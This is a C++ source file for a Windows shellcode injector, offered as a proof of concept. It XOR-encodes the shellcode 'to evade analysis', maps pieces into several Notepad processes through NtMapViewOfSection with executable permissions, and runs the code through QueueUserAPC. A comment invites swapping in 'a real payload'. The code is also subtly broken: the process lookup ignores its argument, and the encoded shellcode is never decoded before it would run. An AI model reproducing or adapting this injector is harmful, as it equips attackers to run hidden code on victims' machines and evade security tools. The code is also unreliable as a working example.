#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <winternl.h>

// Definition of NtDLL functions
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
);

// Simple PoC shellcode (can be replaced with a real payload)
unsigned char shellcode[] = 
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41";

size_t shellcodeSize = sizeof(shellcode) - 1;
int numParts = 3;  // Split the shellcode into 3 parts

std::vector<DWORD> processList;

// 🔑 **Shellcode Encryption (XOR)**
void EncryptDecryptShellcode(unsigned char* data, size_t size) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= 0xAA;  // XOR with 0xAA to evade analysis
    }
}

// 🔎 **Find Target Processes**
DWORD FindProcessID(const wchar_t* processName) {
    DWORD processID = 0;
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &processEntry)) {
        do {
            char procName[260] = { 0 };
            size_t convertedChars = 0;
            wcstombs_s(&convertedChars, procName, processEntry.szExeFile, _TRUNCATE);

            if (_stricmp(procName, "notepad.exe") == 0) {
                processID = processEntry.th32ProcessID;
                processList.push_back(processID);
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return processID;
}

// 🛠 **Injection via NtMapViewOfSection**
bool InjectFragment(DWORD pid, unsigned char* fragment, size_t fragmentSize, LPVOID& remoteAddress, HANDLE& hSection) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    // Create shared memory section (RW)
    SIZE_T sectionSize = fragmentSize;
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateSection");
    if (!NtCreateSection) return false;

    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) return false;

    // Map section RW locally
    LPVOID localAddress = NULL;
    SIZE_T viewSize = fragmentSize;
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtMapViewOfSection");
    if (!NtMapViewOfSection) return false;

    // Fixing the InheritDisposition flag (2 represents ViewShare)
    NtMapViewOfSection(hSection, GetCurrentProcess(), &localAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);

    // Copy encrypted shellcode to the section
    memcpy(localAddress, fragment, fragmentSize);

    // Map section in remote process with RX permissions
    NtMapViewOfSection(hSection, hProcess, &remoteAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);

    CloseHandle(hProcess);
    return true;
}

// 🚀 **Execute shellcode via QueueUserAPC**
void ExecuteShellcode(DWORD pid, LPVOID remoteAddress) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;

    HANDLE hThread = NULL;
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (Thread32First(hSnapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == pid) {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                if (hThread) {
                    QueueUserAPC((PAPCFUNC)remoteAddress, hThread, NULL);
                    CloseHandle(hThread);
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &threadEntry));
    }
    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
}

int main() {
    FindProcessID(L"notepad.exe");

    if (processList.size() < numParts + 1) {
        std::cout << "[-] Not enough target processes. Open more instances of Notepad!" << std::endl;
        return -1;
    }

    // 🔑 **Encrypt Shellcode before Injection**
    EncryptDecryptShellcode(shellcode, shellcodeSize);

    size_t partSize = shellcodeSize / numParts;
    std::vector<LPVOID> allocatedAddresses;
    HANDLE sectionHandles[3];

    std::cout << "[*] Injecting shellcode fragments...\n";
    for (int i = 0; i < numParts; i++) {
        LPVOID remoteAddress = NULL;
        DWORD targetPID = processList[i];

        if (!InjectFragment(targetPID, shellcode + (i * partSize), partSize, remoteAddress, sectionHandles[i])) {
            std::cout << "[-] Injection failed in process " << targetPID << std::endl;
            return -1;
        }

        allocatedAddresses.push_back(remoteAddress);
        std::cout << "[+] Fragment " << i + 1 << " injected into PID: " << targetPID << std::endl;
    }

    // Choose a final process (firefox.exe)
    DWORD finalProcessPID = FindProcessID(L"firefox.exe");
    LPVOID finalAddress = NULL;
    HANDLE finalSection;

    if (!InjectFragment(finalProcessPID, shellcode, shellcodeSize, finalAddress, finalSection)) {
        std::cout << "[-] Shellcode reconstruction failed!" << std::endl;
        return -1;
    }

    std::cout << "[*] Executing shellcode in final process: " << finalProcessPID << "\n";
    ExecuteShellcode(finalProcessPID, finalAddress);

    return 0;
}
